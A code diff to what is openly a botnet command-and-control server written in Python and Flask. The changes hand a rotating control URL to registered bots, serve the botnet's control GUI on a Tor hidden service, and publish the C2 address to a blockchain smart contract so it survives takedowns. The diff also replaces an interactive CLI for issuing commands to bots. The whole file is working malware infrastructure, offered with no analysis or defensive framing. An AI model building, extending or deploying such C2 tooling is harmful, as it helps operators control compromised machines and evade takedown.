@@ -10,6 +10,7 @@ import threading
 import platform
 import socks
 import logging
+from pathlib import Path
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from scapy.all import sr, IP, ICMP, TCP, ARP, Ether
@@ -27,12 +28,28 @@ import psutil
 from subprocess import Popen, PIPE
 import csv
 import stat
+from urllib.parse import urlparse
 from flask import Flask, request, jsonify, send_from_directory
+
+CURRENT_DIR = Path(__file__).resolve().parent
+PROJECT_ROOT = CURRENT_DIR.parent
+GHOST_COMM_ROOT = PROJECT_ROOT / "Ghost_Comm"
+TORSITE_ROOT = GHOST_COMM_ROOT / "NODES" / "torsite"
+GUI_INDEX_HTML = CURRENT_DIR / "WEB-GUI" / "GUI-index.html"
+
+if str(GHOST_COMM_ROOT) not in sys.path:
+    sys.path.insert(0, str(GHOST_COMM_ROOT))
+
+try:
+    from update_torsite_html import update_hidden_service_html
+except ImportError:
+    update_hidden_service_html = None
 
 app = Flask(__name__)
 
 # --- Configuration ---
 ENCRYPTION_KEY = b'sixteen byte key'
+CONTROL_URL_PATH = Path.home() / "CONTROL-URL"
 
 # --- Logging ---
 logging.basicConfig(
@@ -41,6 +58,95 @@ logging.basicConfig(
     datefmt='%Y-%m-%d %H:%M:%S'
 )
 logger = logging.getLogger('C2')
+
+_control_url_state = {"value": None, "mtime": None}
+
+
+def _sync_control_url_html(onion_url: str) -> None:
+    """Ensure the torsite hidden service serves the botnet GUI."""
+    if not onion_url:
+        logger.debug("No onion URL provided for HTML sync.")
+        return
+
+    if update_hidden_service_html is None:
+        logger.warning("update_torsite_html module unavailable; cannot sync onion HTML.")
+        return
+
+    parsed = urlparse(onion_url if "://" in onion_url else f"http://{onion_url}")
+    onion_host = parsed.hostname or parsed.path
+    if not onion_host:
+        logger.warning("Failed to parse onion host from CONTROL-URL: %s", onion_url)
+        return
+
+    if not GUI_INDEX_HTML.is_file():
+        logger.warning("GUI index HTML missing at %s; skipping sync.", GUI_INDEX_HTML)
+        return
+
+    if not TORSITE_ROOT.is_dir():
+        logger.warning("Torsite root directory missing at %s; cannot sync onion HTML.", TORSITE_ROOT)
+        return
+
+    try:
+        destination = update_hidden_service_html(
+            onion_address=onion_host,
+            html_source=GUI_INDEX_HTML,
+            torsite_root=TORSITE_ROOT,
+            output_name="index.html",
+            backup=True,
+        )
+    except Exception:
+        logger.exception("Failed to sync torsite HTML for %s", onion_host)
+        return
+
+    logger.info("Synced torsite HTML for %s -> %s", onion_host, destination)
+
+def get_control_url(path: Path = CONTROL_URL_PATH):
+    """Return the current control URL, reloading the file when it changes."""
+    global _control_url_state
+
+    try:
+        stat_result = path.stat()
+        mtime = stat_result.st_mtime
+    except FileNotFoundError:
+        if _control_url_state["value"]:
+            logger.warning("CONTROL-URL file missing; retaining last known value.")
+        _control_url_state = {"value": None, "mtime": None}
+        return None
+    except Exception:
+        logger.exception("Failed to stat CONTROL-URL file.")
+        return _control_url_state["value"]
+
+    if _control_url_state["mtime"] != mtime:
+        try:
+            url = path.read_text(encoding='utf-8').strip()
+            if not url:
+                raise ValueError("CONTROL-URL file is empty.")
+        except ValueError:
+            logger.error("CONTROL-URL file is empty.")
+            _control_url_state["value"] = None
+            _control_url_state["mtime"] = mtime
+            return None
+        except Exception:
+            logger.exception("Failed to read CONTROL-URL file.")
+            return _control_url_state["value"]
+
+        previous = _control_url_state["value"]
+        _control_url_state["value"] = url
+        _control_url_state["mtime"] = mtime
+        if url != previous:
+            logger.info(f"Control URL updated to {url}")
+            _sync_control_url_html(url)
+        else:
+            logger.debug("CONTROL-URL file touched but URL unchanged.")
+
+    return _control_url_state["value"]
+
+# Prime the cache so the operator sees the initial state in the logs.
+_initial_control_url = get_control_url()
+if _initial_control_url:
+    logger.info(f"Active control URL set to {_initial_control_url}")
+else:
+    logger.warning("Control URL is not set; check CONTROL-URL file.")
 
 # --- Bot Management ---
 bots = {}
@@ -86,7 +192,11 @@ def register_bot():
     public_ip = info.get('ip')
     bots[bot_id] = {'info': info, 'last_seen': time.time(), 'public_ip': public_ip, 'status': 'green'}
     logger.info(f"Registered new bot: {bot_id} with public IP: {public_ip}")
-    return jsonify({'status': 'ok'})
+    response_payload = {'status': 'ok'}
+    control_url = get_control_url()
+    if control_url:
+        response_payload['control_url'] = control_url
+    return jsonify(response_payload)
 
 @app.route('/api/bot/ping', methods=['POST'])
 def ping():
@@ -97,7 +207,11 @@ def ping():
     if bot_id in bots:
         bots[bot_id]['last_seen'] = time.time()
         logger.info(f"Received ping from bot: {bot_id}")
-        return jsonify({'status': 'ok', 'output': 'pong'})
+        response_payload = {'status': 'ok', 'output': 'pong'}
+        control_url = get_control_url()
+        if control_url:
+            response_payload['control_url'] = control_url
+        return jsonify(response_payload)
     else:
         logger.warning(f"Received ping from unknown bot: {bot_id}")
         return jsonify({'status': 'error', 'output': 'not registered'})
@@ -110,7 +224,11 @@ def poll_commands(bot_id):
         logger.info(f"Sending command to bot {bot_id}: {command}")
         return encrypted_command
     else:
-        return jsonify({'status': 'ok', 'output': 'no commands'})
+        response_payload = {'status': 'ok', 'output': 'no commands'}
+        control_url = get_control_url()
+        if control_url:
+            response_payload['control_url'] = control_url
+        return jsonify(response_payload)
 
 @app.route('/api/bot/response/<bot_id>', methods=['POST'])
 def receive_response(bot_id):
@@ -164,43 +282,43 @@ def issue_c2_command():
         if bot_id not in commands:
             commands[bot_id] = []
         commands[bot_id].append(command_obj)
-    
+
     logger.info(f"Issued command '{command}' to bots: {targets}")
     return jsonify({'status': 'ok'})
 
-# --- C2 CLI ---
-def print_bots():
-    print("--- Registered Bots ---")
-    for bot_id, bot_info in bots.items():
-        print(f"ID: {bot_id}, Info: {bot_info['info']}, Last Seen: {time.ctime(bot_info['last_seen'])}")
+from blockchain_utils import compile_contract, deploy_contract, get_contract_instance, set_c2_url
+from web3 import Web3
 
-def issue_command():
-    bot_id = input("Enter bot ID to command: ")
-    if bot_id not in bots:
-        print("Invalid bot ID.")
-        return
+# --- Blockchain Integration ---
+GANACHE_URL = "http://127.0.0.1:7545"
+CONTRACT_META_FILE = "contract_meta.json"
 
-    command_type = input("Enter command type (command/function): ")
-    if command_type == 'command':
-        command = input("Enter command to execute: ")
-        command_obj = {'type': 'command', 'command': command, 'command_id': random.randint(1000, 9999)}
-    elif command_type == 'function':
-        function_name = input("Enter function name: ")
-        params_str = input("Enter params (JSON format): ")
-        try:
-            params = json.loads(params_str)
-        except json.JSONDecodeError:
-            print("Invalid JSON format for params.")
-            return
-        command_obj = {'type': 'function', 'function': function_name, 'params': params, 'command_id': random.randint(1000, 9999)}
-    else:
-        print("Invalid command type.")
-        return
-
-    if bot_id not in commands:
-        commands[bot_id] = []
-    commands[bot_id].append(command_obj)
-    print(f"Command issued to bot {bot_id}.")
+def update_c2_url_on_blockchain(c2_url):
+    try:
+        with open(CONTRACT_META_FILE, 'r') as f:
+            contract_meta = json.load(f)
+        w3 = Web3(Web3.HTTPProvider(GANACHE_URL))
+        contract_instance = get_contract_instance(w3, contract_meta['address'], contract_meta['abi'])
+        set_c2_url(contract_instance, w3, c2_url)
+        logger.info(f"Successfully updated C2 URL on the blockchain: {c2_url}")
+    except FileNotFoundError:
+        logger.warning(f"{CONTRACT_META_FILE} not found. Deploying a new contract.")
+        with open('C2UrlRegistry.sol', 'r') as f:
+            solidity_source = f.read()
+        w3 = Web3(Web3.HTTPProvider(GANACHE_URL))
+        contract_interface = compile_contract(solidity_source)
+        contract_address = deploy_contract(w3, contract_interface)
+        logger.info(f"Contract deployed at: {contract_address}")
+        with open(CONTRACT_META_FILE, 'w') as f:
+            json.dump({
+                'address': contract_address,
+                'abi': contract_interface['abi']
+            }, f)
+        contract_instance = get_contract_instance(w3, contract_address, contract_interface['abi'])
+        set_c2_url(contract_instance, w3, c2_url)
+        logger.info(f"Successfully updated C2 URL on the blockchain: {c2_url}")
+    except Exception as e:
+        logger.error(f"Error updating C2 URL on the blockchain: {e}")
 
 def main():
     # Start status checking thread
@@ -208,26 +326,22 @@ def main():
     status_thread.daemon = True
     status_thread.start()
 
-    # Start Flask server in a separate thread
-    flask_thread = threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000})
-    flask_thread.daemon = True
-    flask_thread.start()
+    # Ensure torsite HTML matches the current CONTROL-URL at startup
+    current_url = get_control_url()
+    if current_url:
+        _sync_control_url_html(current_url)
+        update_c2_url_on_blockchain(current_url)
 
-    while True:
-        print("\n--- C2 CLI ---")
-        print("1. List bots")
-        print("2. Issue command")
-        print("3. Exit")
-        choice = input("Enter your choice: ")
-
-        if choice == '1':
-            print_bots()
-        elif choice == '2':
-            issue_command()
-        elif choice == '3':
-            sys.exit(0)
-        else:
-            print("Invalid choice.")
+    # Start Flask server
+    control_url_for_display = get_control_url()
+    if control_url_for_display:
+        message = f"C2 server running on http://127.0.0.1:5000 and accessible via onion address: {control_url_for_display}"
+        logger.info(message)
+        print(f"[*] {message}")
+    else:
+        logger.warning("No control URL configured; update CONTROL-URL for onion address.")
+    
+    app.run(host='0.0.0.0', port=5000)
 
 @app.route('/')
 def index():
